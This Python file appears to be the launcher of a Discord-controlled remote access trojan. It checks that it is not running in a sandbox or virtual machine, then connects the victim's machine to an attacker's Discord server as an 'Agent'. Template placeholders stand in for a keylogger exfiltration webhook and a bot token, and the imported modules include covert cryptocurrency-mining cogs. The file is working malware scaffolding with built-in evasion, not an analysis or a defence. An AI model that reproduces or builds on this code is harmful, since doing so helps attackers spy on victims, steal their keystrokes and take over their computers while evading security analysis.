
import discord
from code.discord.bot import BOT
from libraries import sandboxevasion, maciassdopia

from code.discord.cogs import commands, interactButton, cryptoMining, miningInteractButtons


GUILD = discord.Object(id = "{GUILD}")
CHANNEL = int("{CHANNEL}")
KEYLOG_WEBHOOK = "{KEYLOG_WEBHOOK}"


if sandboxevasion.test() == True and maciassdopia.isVM() == False:
    config = maciassdopia.createConfig()
    ID = maciassdopia.id()

    bot = BOT(CHANNEL, GUILD, ID, KEYLOG_WEBHOOK)

    if config:
        bot.msg = f"New Agent Online #{ID}"
        bot.color = 0x00ff00
    else:
        bot.msg =f"Agent Online #{ID}"
        bot.color = 0x0000FF

    bot.run("{TOKEN}")
